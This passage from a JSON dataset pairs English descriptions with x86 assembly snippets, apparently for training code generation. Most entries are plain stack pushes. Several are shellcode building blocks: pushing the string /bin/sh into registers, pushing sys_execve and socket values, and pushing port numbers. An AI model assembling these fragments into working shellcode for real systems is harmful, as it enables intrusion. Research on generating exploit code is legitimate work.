  },
  {
    "intent": "push edx on the stack",
    "rewritten_intent": "push edx on the stack",
    "snippet": "push edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the edx register onto the stack and point eax to the stack register",
    "rewritten_intent": "push the contents of the edx register onto the stack and point eax to the stack register",
    "snippet": "push edx \\n mov eax, esp",
    "slot_map": {
      "edx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the edx register onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the contents of the edx register onto the stack and point ebx to the stack register",
    "snippet": "push edx \\n mov ebx, esp",
    "slot_map": {
      "edx": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the edx register onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the contents of the edx register onto the stack and point ecx to the stack register",
    "snippet": "push edx \\n mov ecx, esp",
    "slot_map": {
      "edx": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "preserve esi on the stack",
    "rewritten_intent": "preserve esi on the stack",
    "snippet": "push esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "preserve",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the esi register onto the stack",
    "rewritten_intent": "push the contents of the esi register onto the stack",
    "snippet": "push esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the esi register onto the stack.",
    "rewritten_intent": "push the contents of the esi register onto the stack.",
    "snippet": "push esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "."
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the esi onto the stack",
    "rewritten_intent": "push the esi onto the stack",
    "snippet": "push esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push esi onto the stack",
    "rewritten_intent": "push esi onto the stack",
    "snippet": "push esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of esi register onto the stack",
    "rewritten_intent": "push the contents of esi register onto the stack",
    "snippet": "push esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push esi on the stack",
    "rewritten_intent": "push esi on the stack",
    "snippet": "push esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the contents of the esi register onto the stack and point eax to the stack register",
    "rewritten_intent": "push the contents of the esi register onto the stack and point eax to the stack register",
    "snippet": "push esi \\n mov eax, esp",
    "slot_map": {
      "esi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the esi register onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the contents of the esi register onto the stack and point ebx to the stack register",
    "snippet": "push esi \\n mov ebx, esp",
    "slot_map": {
      "esi": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the esi register onto the stack and point edx to the stack register",
    "rewritten_intent": "push the contents of the esi register onto the stack and point edx to the stack register",
    "snippet": "push esi \\n mov edx, esp",
    "slot_map": {
      "esi": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "register",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the contents of esp register onto the stack",
    "rewritten_intent": "push the contents of esp register onto the stack",
    "snippet": "push esp",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "contents",
      "esp",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "esp"
    ]
  },
  {
    "intent": "push the contents of the esp register onto the stack",
    "rewritten_intent": "push the contents of the esp register onto the stack",
    "snippet": "push esp",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "contents",
      "esp",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "esp"
    ]
  },
  {
    "intent": "push the esp onto the stack",
    "rewritten_intent": "push the esp onto the stack",
    "snippet": "push esp",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "esp",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "esp"
    ]
  },
  {
    "intent": "push esp to the stack",
    "rewritten_intent": "push esp to the stack",
    "snippet": "push esp",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "esp",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "esp"
    ]
  },
  {
    "intent": "push esp onto the stack",
    "rewritten_intent": "push esp onto the stack",
    "snippet": "push esp",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "esp",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "esp"
    ]
  },
  {
    "intent": "push len onto the stack",
    "rewritten_intent": "push len onto the stack",
    "snippet": "push len",
    "slot_map": {
      "len": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "move /bin/sh into the eax register",
    "rewritten_intent": "move /bin/sh into the eax register",
    "snippet": "push long 0x68732f2f \\n push long 0x6e69622f \\n mov eax, esp",
    "slot_map": {
      "move /bin/sh": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "long",
      "0x68732f2f",
      "\\n",
      "push",
      "long",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move /bin/sh into the ebx register",
    "rewritten_intent": "move /bin/sh into the ebx register",
    "snippet": "push long 0x68732f2f \\n push long 0x6e69622f \\n mov ebx, esp",
    "slot_map": {
      "move /bin/sh": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "long",
      "0x68732f2f",
      "\\n",
      "push",
      "long",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "put /bin/sh into the ecx register",
    "rewritten_intent": "put /bin/sh into the ecx register",
    "snippet": "push long 0x68732f2f \\n push long 0x6e69622f \\n mov ecx, esp",
    "slot_map": {
      "put /bin/sh": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "long",
      "0x68732f2f",
      "\\n",
      "push",
      "long",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "put /bin/sh into the edx register",
    "rewritten_intent": "put /bin/sh into the edx register",
    "snippet": "push long 0x68732f2f \\n push long 0x6e69622f \\n mov edx, esp",
    "slot_map": {
      "put /bin/sh": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "long",
      "0x68732f2f",
      "\\n",
      "push",
      "long",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push name onto the stack",
    "rewritten_intent": "push name onto the stack",
    "snippet": "push name",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "name",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "name"
    ]
  },
  {
    "intent": "push address of string print_msg",
    "rewritten_intent": "push address of string print_msg",
    "snippet": "push offset printf_msg",
    "slot_map": {
      "print_msg": "var0"
    },
    "intent_tokens": [
      "push",
      "address",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "push",
      "offset",
      "printf_msg"
    ]
  },
  {
    "intent": "push the contents in ogin onto the stack",
    "rewritten_intent": "push the contents in ogin onto the stack",
    "snippet": "push ogin",
    "slot_map": {
      "ogin": "var0"
    },
    "intent_tokens": [
      "push",
      "contents",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push sock_reg onto the stack",
    "rewritten_intent": "push sock_reg onto the stack",
    "snippet": "push sock_reg",
    "slot_map": {
      "sock_reg": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the sock_reg onto the stack",
    "rewritten_intent": "push the sock_reg onto the stack",
    "snippet": "push sock_reg",
    "slot_map": {
      "sock_reg": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push sys_execve onto the stack",
    "rewritten_intent": "push sys_execve onto the stack",
    "snippet": "push sys_execve",
    "slot_map": {
      "sys_execve": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the word [edx] onto the stack",
    "rewritten_intent": "push the word [edx] onto the stack",
    "snippet": "push word [edx]",
    "slot_map": {
      "edx": "var1",
      "[": "var0",
      "]": "var2"
    },
    "intent_tokens": [
      "push",
      "word",
      "[",
      "var1",
      "]",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the word [edx] to the stack",
    "rewritten_intent": "push the word [edx] to the stack",
    "snippet": "push word [edx]",
    "slot_map": {
      "edx": "var1",
      "[": "var0",
      "]": "var2"
    },
    "intent_tokens": [
      "push",
      "word",
      "[",
      "var1",
      "]",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the word 0544o onto the stack",
    "rewritten_intent": "push the word 0544o onto the stack",
    "snippet": "push word 0544o",
    "slot_map": {
      "0544o": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0644o onto the stack",
    "rewritten_intent": "push the word 0644o onto the stack",
    "snippet": "push word 0644o",
    "slot_map": {
      "0644o": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0666q onto the stack",
    "rewritten_intent": "push the word 0666q onto the stack",
    "snippet": "push word 0666q",
    "slot_map": {
      "0666q": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x02 onto the stack",
    "rewritten_intent": "push the word 0x02 onto the stack",
    "snippet": "push word 0x02",
    "slot_map": {
      "0x02": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x0a onto the stack",
    "rewritten_intent": "push the word 0x0a onto the stack",
    "snippet": "push word 0x0a",
    "slot_map": {
      "0x0a": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x0a to the stack",
    "rewritten_intent": "push the word 0x0a to the stack",
    "snippet": "push word 0x0a",
    "slot_map": {
      "0x0a": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x0f27 onto the stack",
    "rewritten_intent": "push the word 0x0f27 onto the stack",
    "snippet": "push word 0x0f27",
    "slot_map": {
      "0x0f27": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x1b6 to the stack",
    "rewritten_intent": "push the word 0x1b6 to the stack",
    "snippet": "push word 0x1b6",
    "slot_map": {
      "0x1b6": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x1b6 onto the stack",
    "rewritten_intent": "push the word 0x1b6 onto the stack",
    "snippet": "push word 0x1b6",
    "slot_map": {
      "0x1b6": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x1ff onto the stack",
    "rewritten_intent": "push the word 0x1ff onto the stack",
    "snippet": "push word 0x1ff",
    "slot_map": {
      "0x1ff": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x2 onto the stack",
    "rewritten_intent": "push the word 0x2 onto the stack",
    "snippet": "push word 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x2 to the stack",
    "rewritten_intent": "push the word 0x2 to the stack",
    "snippet": "push word 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push 0x2923 onto stack port",
    "rewritten_intent": "push 0x2923 onto stack port",
    "snippet": "push word 0x2923",
    "slot_map": {
      "0x2923": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack",
      "port"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x2e2e onto the stack",
    "rewritten_intent": "push the word 0x2e2e onto the stack",
    "snippet": "push word 0x2e2e",
    "slot_map": {
      "0x2e2e": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x3436 onto the stack",
    "rewritten_intent": "push the word 0x3436 onto the stack",
    "snippet": "push word 0x3436",
    "slot_map": {
      "0x3436": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x3582 onto the stack",
    "rewritten_intent": "push the word 0x3582 onto the stack",
    "snippet": "push word 0x3582",
    "slot_map": {
      "0x3582": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x3636 onto the stack",
    "rewritten_intent": "push the word 0x3636 onto the stack",
    "snippet": "push word 0x3636",
    "slot_map": {
      "0x3636": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x3905 to the stack",
    "rewritten_intent": "push the word 0x3905 to the stack",
    "snippet": "push word 0x3905",
    "slot_map": {
      "0x3905": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x3905 onto the stack",
    "rewritten_intent": "push the word 0x3905 onto the stack",
    "snippet": "push word 0x3905",
    "slot_map": {
      "0x3905": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x3930 onto the stack",
    "rewritten_intent": "push the word 0x3930 onto the stack",
    "snippet": "push word 0x3930",
    "slot_map": {
      "0x3930": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x401f onto the stack",
    "rewritten_intent": "push the word 0x401f onto the stack",
    "snippet": "push word 0x401f",
    "slot_map": {
      "0x401f": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x4255 onto the stack",
    "rewritten_intent": "push the word 0x4255 onto the stack",
    "snippet": "push word 0x4255",
    "slot_map": {
      "0x4255": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x462d to the stack",
    "rewritten_intent": "push the word 0x462d to the stack",
    "snippet": "push word 0x462d",
    "slot_map": {
      "0x462d": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x462d onto the stack",
    "rewritten_intent": "push the word 0x462d onto the stack",
    "snippet": "push word 0x462d",
    "slot_map": {
      "0x462d": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push 0x5000 onto stack port",
    "rewritten_intent": "push 0x5000 onto stack port",
    "snippet": "push word 0x5000",
    "slot_map": {
      "0x5000": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack",
      "port"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x5445 onto the stack",
    "rewritten_intent": "push the word 0x5445 onto the stack",
    "snippet": "push word 0x5445",
    "slot_map": {
      "0x5445": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x5974 onto the stack",
    "rewritten_intent": "push the word 0x5974 onto the stack",
    "snippet": "push word 0x5974",
    "slot_map": {
      "0x5974": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x5c11 onto the stack",
    "rewritten_intent": "push the word 0x5c11 onto the stack",
    "snippet": "push word 0x5c11",
    "slot_map": {
      "0x5c11": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x5c11 to the stack",
    "rewritten_intent": "push the word 0x5c11 to the stack",
    "snippet": "push word 0x5c11",
    "slot_map": {
      "0x5c11": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x632d onto the stack",
    "rewritten_intent": "push the word 0x632d onto the stack",
    "snippet": "push word 0x632d",
    "slot_map": {
      "0x632d": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x632d to the stack",
    "rewritten_intent": "push the word 0x632d to the stack",
    "snippet": "push word 0x632d",
    "slot_map": {
      "0x632d": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x632d onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the word 0x632d onto the stack and point the eax register to the stack register",
    "snippet": "push word 0x632d \\n mov eax, esp",
    "slot_map": {
      "0x632d": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x632d onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the word 0x632d onto the stack and point the ebx register to the stack register",
    "snippet": "push word 0x632d \\n mov ebx, esp",
    "slot_map": {
      "0x632d": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x632d onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the word 0x632d onto the stack and point the ecx register to the stack register",
    "snippet": "push word 0x632d \\n mov ecx, esp",
    "slot_map": {
      "0x632d": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x632d onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push the word 0x632d onto the stack and point the edi register to the stack register",
    "snippet": "push word 0x632d \\n mov edi, esp",
    "slot_map": {
      "0x632d": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x632d onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the word 0x632d onto the stack and point the edx register to the stack register",
    "snippet": "push word 0x632d \\n mov edx, esp",
    "slot_map": {
      "0x632d": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x632d onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push the word 0x632d onto the stack and point the esi register to the stack register",
    "snippet": "push word 0x632d \\n mov esi, esp",
    "slot_map": {
      "0x632d": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x6465 onto the stack",
    "rewritten_intent": "push the word 0x6465 onto the stack",
    "snippet": "push word 0x6465",
    "slot_map": {
      "0x6465": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x662d onto the stack",
    "rewritten_intent": "push the word 0x662d onto the stack",
    "snippet": "push word 0x662d",
    "slot_map": {
      "0x662d": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x662d onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the word 0x662d onto the stack and point the eax register to the stack register",
    "snippet": "push word 0x662d \\n mov eax, esp",
    "slot_map": {
      "0x662d": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x662d onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the word 0x662d onto the stack and point the ebx register to the stack register",
    "snippet": "push word 0x662d \\n mov ebx, esp",
    "slot_map": {
      "0x662d": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x662d onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the word 0x662d onto the stack and point the ecx register to the stack register",
    "snippet": "push word 0x662d \\n mov ecx, esp",
    "slot_map": {
      "0x662d": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x662d onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push the word 0x662d onto the stack and point the edi register to the stack register",
    "snippet": "push word 0x662d \\n mov edi, esp",
    "slot_map": {
      "0x662d": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x662d onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the word 0x662d onto the stack and point the edx register to the stack register",
    "snippet": "push word 0x662d \\n mov edx, esp",
    "slot_map": {
      "0x662d": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x662d onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push the word 0x662d onto the stack and point the esi register to the stack register",
    "snippet": "push word 0x662d \\n mov esi, esp",
    "slot_map": {
      "0x662d": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the word 0x6666 onto the stack",
    "rewritten_intent": "push the word 0x6666 onto the stack",
    "snippet": "push word 0x6666",
    "slot_map": {
      "0x6666": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x6873 onto the stack",
    "rewritten_intent": "push the word 0x6873 onto the stack",
    "snippet": "push word 0x6873",
    "slot_map": {
      "0x6873": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x692d onto the stack",
    "rewritten_intent": "push the word 0x692d onto the stack",
    "snippet": "push word 0x692d",
    "slot_map": {
      "0x692d": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
  {
    "intent": "push the word 0x697a onto the stack",
    "rewritten_intent": "push the word 0x697a onto the stack",
    "snippet": "push word 0x697a",
    "slot_map": {
      "0x697a": "var0"
    },
    "intent_tokens": [
      "push",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "word",
      "var0"
    ]
  },
